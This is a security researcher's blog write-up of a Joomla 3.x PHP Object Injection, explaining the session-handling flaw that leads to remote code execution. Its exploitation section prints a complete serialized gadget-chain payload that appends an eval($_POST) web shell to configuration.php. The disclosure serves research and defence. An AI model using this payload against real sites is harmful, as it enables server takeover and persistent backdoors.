<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Introduction During one of research activities in Hacktive Security, we discovered an undisclosed PHP Object Injection on Joomla CMS from the 3."><title>Rusty Joomla Remote Code Execution</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://1day.dev//icon.png><link href=https://1day.dev/styles.7153093e4d1bbb584a28469cadfa3f88.min.css rel=stylesheet><link href=https://1day.dev/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://1day.dev/js/darkmode.e6934a61ff52b65bd16cdf94b370f112.min.js></script>
<script src=https://1day.dev/js/util.9825137f5e7825e8553c68ce39ac9e44.min.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/copy-tex.min.js integrity=sha384-ww/583aHhxWkz5DEVn6OKtNiIaLi2iBRNZXfJRiY1Ai7tnJ9UXpEsyvOITVpTl4A crossorigin=anonymous></script>
<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
<script src=https://1day.dev/js/popover.53ad9a087e3feeaaa12b63bfd02d923b.min.js></script>
<script src=https://1day.dev/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
<script src=https://1day.dev/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
<script src=https://1day.dev/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
<script>const BASE_URL="https://1day.dev/",fetchData=Promise.all([fetch("https://1day.dev/indices/linkIndex.f95908f70ec33c60c8fcda9ef7621f27.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://1day.dev/indices/contentIndex.5c49f53035f37189484f6e1b10e6b39a.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://1day.dev",!1,!0)},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],macros:{'â€™':"'"},throwOnError:!1})}</script><script type=module>
    import { attachSPARouting } from "https:\/\/1day.dev\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
    attachSPARouting(init, render)
  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-BZ6HJYMG3K"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-BZ6HJYMG3K",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
<script defer src=https://1day.dev/js/full-text-search.24827f874defbbc6d529926cbfcfb493.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://1day.dev/>ðŸ‘¾ @kiks</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>Rusty Joomla Remote Code Execution</h1><p class=meta>Last updated
Oct 3, 2019</p><ul class=tags><li><a href=https://1day.dev/tags/Web/>Web</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#introduction>Introduction</a></li><li><a href=#how-sessions-works>How Sessions works</a></li><li><a href=#the-vulnerability>The vulnerability</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#poc>POC</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#references>References</a></li></ol></nav></details></aside><a href=#introduction><h2 id=introduction><span class=hanchor arialabel=Anchor># </span>Introduction</h2></a><p>During one of research activities in
<a href=http://hacktivesecurity.com/ rel=noopener>Hacktive Security</a>, we discovered an <strong>undisclosed PHP Object Injection</strong> on Joomla CMS from the 3.0.0 release to the 3.4.6 (releases from 2012 to December 2015) that leads to Remote Code Execution.
A PHP Object Injection was discovered in the wild and patched in the 3.4.5 version (CVE-2015-8562), however, this vulnerability depends also a lot on the PHP release installed becoming not really trusty for all environments.</p><p>Comparing this RCE with CVE-2015-8562:</p><ul><li>+ It is completely independent from the environment, becoming more reliable;</li><li>+ Vulnerable from the 3.0.0 to 3.4.6 (just one more minor release, not so much);</li><li>- Few releases vulnerable compared to CVE-2015-8562.</li></ul><p>However, the fun part of this vulnerability was the exploitation. There arenâ€™t a lot of blog posts about some more advanced and manual exploitation of PHP Object Injection (except for some good resources from RIPS) so this paper can be useful while exploiting it in other contexts.</p><a href=#how-sessions-works><h2 id=how-sessions-works><span class=hanchor arialabel=Anchor># </span>How Sessions works</h2></a><p>Joomla sessions are stored in the database as PHP Objects and they are handled by PHP session functions. It is an interesting attack vector because sessions are also stored for unauthenticated users so an Object Injection there can lead to unauthenticated RCE.</p><p>Functions <code>read()</code> and <code>write()</code> defined in <code>libraries/joomla/session/storage/database.php</code> are set by the <code>session_set_save_handler()</code> in order to be used as read and write handlers for the <code>session_start()</code> call at <code>libraries/joomla/session/session.php:__start</code></p><p>This is an example of a classic Joomla (before 3.4.6) session stored in the database for an unauthenticated user (at table <code>__session</code>):</p><p><img src=https://1day.dev//notes/images/rusty/0.png width=auto alt=img></p><p>There are many objects defined, but the most interesting thing is how input parameters are handled in the session. If we make a regular action with parameters, these ones and the result message of the action, are stored in the session object like this:</p><p><img src=https://1day.dev//notes/images/rusty/1.png width=auto alt=img></p><p>When we perform POST requests in Joomla we usually have a 303 redirect that will redirect us to the result page. Thatâ€™s an important note for the exploitation, because the first request (with parameters) will only cause Joomla to perform the action and store (e.g. call the <code>write()</code> function) the session, then the 303 redirect will retrieve (e.g. call the <code>read()</code> function) it and display the message back to the user.</p><a href=#the-vulnerability><h2 id=the-vulnerability><span class=hanchor arialabel=Anchor># </span>The vulnerability</h2></a><p>This is the code for the read and write functions (just removed unnecessary code).</p><p><img src=https://1day.dev//notes/images/rusty/2.png width=500 alt=img|500></p><p>The write function accept 2 parameters, the <code>session_id</code> (from the cookie) and the serialized object. Before storing data into the database there is an interesting replace of <code>\x00\x2a\x00</code> (<code>chr(0)."*".chr(0)</code>) with <code>\0\0\0</code>. Thatâ€™s because MySQL cannot save null bytes and <code>$protected</code> variables are prefixed with <code>\x00\x2a\x00</code> in the serialized object.</p><p>On the other hand, when reading, the read function will replace <code>\0\0\0</code> with <code>\x00\x2a\x00</code> in order to reconstruct the original object.</p><p>The main issue with this replace is that itâ€™s replacing 3 bytes with 6 bytes:</p><p><img src=https://1day.dev//notes/images/rusty/3.png width=500 alt=img|500></p><p>This behaviour has been introduced from the 3.0.0 version and affecting Joomla until 3.4.6. Starting from 3.4.7 the piece of code is still present but the session is base64 encoded and stored in the database.</p><p>As I said before, we can manipulate the session object through action parameters. In this way, we can inject <code>\0\0\0</code> that will be replaced from the read function with 3 bytes, invalidating the object because of incorrect size. If we take the login form as a target and we put <code>my\0\0\0username</code> in the username field, we end up with the following part of object in the database:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>s</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=nx>s</span><span class=o>:</span><span class=s2>&#34;username&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>16</span><span class=o>:</span><span class=s2>&#34;my</span><span class=se>\0\0\0</span><span class=s2>username&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>When the session object is read from the read function, <code>\0\0\0</code> will be replaced as demonstrated before, assembling the following value:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>s</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=nx>s</span><span class=o>:</span><span class=s2>&#34;username&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>16</span><span class=o>:</span><span class=s2>&#34;myN\*Nusername&#34;</span> <span class=o>--&gt;</span> <span class=nx>Invalid</span> <span class=nx>Size</span>
</span></span></code></pre></td></tr></table></div></div><p>The replaced string is only 13 bytes long but the declared string size is still 16!
We can now take this â€˜overflowâ€™ to our advantage and forge a new object that will lead us to the final goal&mldr; RCE! :)</p><a href=#exploitation><h2 id=exploitation><span class=hanchor arialabel=Anchor># </span>Exploitation</h2></a><p>In order to trigger our arbitrary object and achieve RCE we need two parameters in a row, the first one will cause the â€˜overflowâ€™ and the second will contain the last part of the exploit. The perfect target (included in a default installation) is the login form with the â€˜usernameâ€™ and â€˜passwordâ€™ fields.</p><p>Thatâ€™s the plan:</p><ul><li>Overflow the username field with enough <code>\0\0\0</code> in order to land in the password field</li><li>Reconstruct a valid object</li><li>Send the exploit</li><li>Trigger the exploit (with the redirect)</li></ul><p>We know that we can downsize the string size. By doing that on the username field (that precede the password) we can fake it and let it ends inside the next parameter under our control.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=p>[</span><span class=o>..</span><span class=p>]</span><span class=nx>s</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=nx>s</span><span class=o>:</span><span class=s2>&#34;username&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;MYUSERNAME&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=s2>&#34;password&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;MYPASSWORD&#34;</span><span class=p>[</span><span class=o>...</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>As you can see, the distance from the end of the username value and the start of the password is 27 bytes. The vulnerable replace let us decrease the value with a multiple of 3 (6 bytes - 3 bytes) so we need at least 8 times <code>\0\0\0</code> in the username field that will cause a simple padding of 1 extra character in the second parameter in our exploit (in the POC I used 9 times <code>\0\0\0</code> to be sure).</p><p>In bold, what unserialize read for the <code>username</code>:</p><hr><p>(in database)
s:8:s:&ldquo;username&rdquo;;s:54:"<strong>\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</strong>";s:8:&ldquo;password&rdquo;;s:10:&ldquo;MYPASSWORD&rdquo;</p><p>(after read and replace)
s:8:s:&ldquo;username&rdquo;;s:54:"<strong>NNNNNNNNNNNNNNNNNNNNNNNNNNN";s:8:&ldquo;password&rdquo;;s:10:&ldquo;MYPA</strong>SSWORD&rdquo;</p><p>(Achieve Object injection):
s:8:s:"<strong>username</strong>";s:54:"<strong>NNNNNNNNNNNNNNNNNNNNNNNNNNN";s:8:&ldquo;password&rdquo;;s:10:&ldquo;MYPA</strong>";s:2:&ldquo;HS&rdquo;:O:15:&ldquo;ObjectInjection&rdquo;[&mldr;]</p><hr><p>We have a stable way to inject an Object, now itâ€™s the time to craft it.
We can use the payload from the CVE-2015-8562 exploit as a starting point, however it requires some modification:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>21</span><span class=o>:</span><span class=s2>&#34;JDatabaseDriverMysqli&#34;</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;</span><span class=se>\0\0\0</span><span class=s2>a&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>17</span><span class=o>:</span><span class=s2>&#34;JSimplepieFactory&#34;</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=p>{}</span><span class=nx>s</span><span class=o>:</span><span class=mi>21</span><span class=o>:</span><span class=s2>&#34;</span><span class=se>\0\0\0</span><span class=s2>disconnectHandlers&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>i</span><span class=o>:</span><span class=mi>0</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>i</span><span class=o>:</span><span class=mi>0</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;SimplePie&#34;</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=s2>&#34;sanitize&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>20</span><span class=o>:</span><span class=s2>&#34;JDatabaseDriverMysql&#34;</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=p>{}</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;cache&#34;</span><span class=p>;</span><span class=nx>b</span><span class=o>:</span><span class=mi>1</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>19</span><span class=o>:</span><span class=s2>&#34;cache_name_function&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;assert&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;javascript&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>9999</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=s2>&#34;feed_url&#34;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>This payload will instantiate a <code>JDatabaseDriverMysqli</code> object and assign an array of other objects in the <code>disconnectHandlers</code> attribute (a protected array variable). This is because the defined <code>__destruct</code> of this class will call <code>$this->disconnect()</code>, that leads to an interesting <code>call_user_func_array()</code>:</p><p><img src=https://1day.dev//notes/images/rusty/4.png width=500 alt=img8|500></p><p>For each value in the <code>disconnectHandlers</code> array a <code>call_user_func_array()</code> is performed with a reference to the object (<code>&$this</code>) as a parameter. Itâ€™s a good gadget, but we only have control over the function call and not on parameters. Thatâ€™s where <code>SimplePie</code> object came in our help.</p><p>In <code>SimplePie::init</code> (declared in <code>libraries/simplepie/simplepie.php</code>) we have different interesting gadgets, like the following:</p><p><img src=https://1day.dev//notes/images/rusty/5.png width=auto alt=img></p><p>This is much more suitable, because we have a <code>call_user_func</code> with both function and parameter values under our control.
However, thatâ€™s why I think the original payload wasnâ€™t working, there is a condition that must be met in order to receive this line of code: <code>$this->cache</code> must be declared and <code>$parsed_feed_url[â€˜schemeâ€™]</code> (the parsed url from $feed_url) needs to contain something.
Bypassing this condition was not so difficult. At first, with <code>cache_name_function</code> set to <code>system</code>, something like <code>https://something/;id</code> was enough. The first command fails but the semicolon do the rest.</p><p>However, while developing the Metasploit module, I was not so happy about this solution. If the target environment have disabled functions like <code>system</code>, <code>exec</code>, <code>shell_exec</code>, etc., you cannot do a lot with this exploit, and I wanted to make something more suitable for more environments.
So, I moved back to the assert function and see if I could achieve the PHP code execution while respecting the condition. The only think the condition is checking for is a string that contains a valid schema (e.g. <code>http://</code> ), but this will cause a syntax error. In order to bypass it we can chain an OR (||) statement and trap the schema into a variable, like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>PHP</span> <span class=nx>CODE</span><span class=o>&gt;</span> <span class=o>||</span> <span class=nv>$a</span><span class=o>=</span><span class=s2>&#34;http//&#34;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>We were limited again against some special characters (like <code>?</code>) and from the <code>assert</code> function, so we need a way to move on a less restrictive environment. The first idea was to create a php file in the root directory with an <code>eval()</code>, but without the <code>?</code> the web server will not interpret our code. A <code>configuration.php</code> file is present in the root directory. It is nothing more than a class declaration with configuration parameters in it. We can append an eval at the end of this file and use it to execute PHP code with the following payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl> <span class=nx>file_put_contents</span><span class=p>(</span><span class=s1>&#39;configuration.php&#39;</span><span class=p>,</span><span class=err>&#39;</span><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=nx>\\\</span><span class=err>&#39;</span><span class=nx>test\\\</span><span class=err>&#39;</span><span class=p>]))</span> <span class=k>eval</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=nx>\\\</span><span class=err>&#39;</span><span class=nx>test\\\</span><span class=err>&#39;</span><span class=p>]);</span><span class=nx>\</span><span class=err>&#39;</span><span class=p>,</span> <span class=nx>FILE_APPEND</span><span class=p>)</span> <span class=o>||</span> <span class=nv>$a</span><span class=o>=</span><span class=nx>\</span><span class=err>&#39;</span><span class=nx>http</span><span class=o>://</span><span class=nx>wtf\</span><span class=err>&#39;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>That will result in the following call:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>call_user_func</span><span class=p>(</span><span class=s2>&#34;assert&#34;</span><span class=p>,</span><span class=s2>&#34;file_put_contents(&#39;configuration.php&#39;,&#39;if(isset(</span><span class=si>$_POST[\\\&#39;test\\\&#39;]</span><span class=s2>)) eval(</span><span class=si>$_POST[\\\&#39;test\\\&#39;]</span><span class=s2>);\&#39;, FILE_APPEND) || </span><span class=si>$a</span><span class=s2>=\&#39;http://wtf\&#39;;&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>At the end, this is the final object:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;HS&#34;</span><span class=o>:</span><span class=nx>O</span><span class=o>:</span><span class=mi>21</span><span class=o>:</span><span class=s2>&#34;JDatabaseDriverMysqli&#34;</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;</span><span class=se>\0\0\0</span><span class=s2>a&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>17</span><span class=o>:</span><span class=s2>&#34;JSimplepieFactory&#34;</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=p>{}</span><span class=nx>s</span><span class=o>:</span><span class=mi>21</span><span class=o>:</span><span class=s2>&#34;</span><span class=se>\0\0\0</span><span class=s2>disconnectHandlers&#34;</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>i</span><span class=o>:</span><span class=mi>0</span><span class=p>;</span><span class=nx>a</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>i</span><span class=o>:</span><span class=mi>0</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;SimplePie&#34;</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=s2>&#34;sanitize&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>20</span><span class=o>:</span><span class=s2>&#34;JDatabaseDriverMysql&#34;</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=p>{}</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;cache&#34;</span><span class=p>;</span><span class=nx>b</span><span class=o>:</span><span class=mi>1</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>19</span><span class=o>:</span><span class=s2>&#34;cache_name_function&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;assert&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;javascript&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>9999</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=s2>&#34;feed_url&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>125</span><span class=o>:</span><span class=s2>&#34;file_put_contents(&#39;configuration.php&#39;,&#39;if(isset(</span><span class=si>$_POST[\&#39;test\&#39;]</span><span class=s2>)) eval(</span><span class=si>$_POST[\&#39;test\&#39;]</span><span class=s2>);&#39;, FILE_APPEND) || </span><span class=si>$a</span><span class=s2>=&#39;http://wtf&#39;;&#34;</span><span class=p>;}</span><span class=nx>i</span><span class=o>:</span><span class=mi>1</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;init&#34;</span><span class=p>;}}</span><span class=nx>s</span><span class=o>:</span><span class=mi>13</span><span class=o>:</span><span class=s2>&#34;</span><span class=se>\0\0\0</span><span class=s2>connection&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>1</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><p>Now we have everything necessary to develop a working exploit. Putting stuff together, we can send the exploit using the login form, this will store the malicious object into the database.
Then we can follow the redirect from the first response and the payload will be retrieved from the database and unserialized from the <code>session_start()</code> function and .. we got RCE!</p><a href=#poc><h2 id=poc><span class=hanchor arialabel=Anchor># </span>POC</h2></a><iframe width=480 height=360 src=https://www.youtube.com/embed/Z-GbT5YB-Tc frameborder=0></iframe>
<a href=#exploit><h2 id=exploit><span class=hanchor arialabel=Anchor># </span>Exploit</h2></a><ul><li><a href=https://www.exploit-db.com/exploits/47465 rel=noopener>https://www.exploit-db.com/exploits/47465</a></li><li><a href=https://www.exploit-db.com/exploits/47539 rel=noopener>https://www.exploit-db.com/exploits/47539</a> (Metasploit)</li></ul><a href=#references><h2 id=references><span class=hanchor arialabel=Anchor># </span>References</h2></a><ul><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2015-8562 rel=noopener>https://nvd.nist.gov/vuln/detail/CVE-2015-8562</a></li><li><a href=https://blog.ripstech.com/2018/woocommerce-php-object-injection/ rel=noopener>https://blog.ripstech.com/2018/woocommerce-php-object-injection/</a></li><li><a href=https://www.php.net/manual/en/ref.session.php rel=noopener>https://www.php.net/manual/en/ref.session.php</a></li></ul></article><hr><div id=contact_buttons><footer><p>Powered by <a href=https://github.com/jackyzha0/quartz>Quartz</a>, Â© 2025</p><ul><li><a href=https://1day.dev/>Home</a></li><li><a href=https://twitter.com/kiks7_7>Twitter</a></li><li><a href=https://github.com/kiks7>Github</a></li><li><a href=https://linkedin.com/in/alessandro-groppo-1a0429146>Linkedin</a></li></ul></footer></div></div></body></html>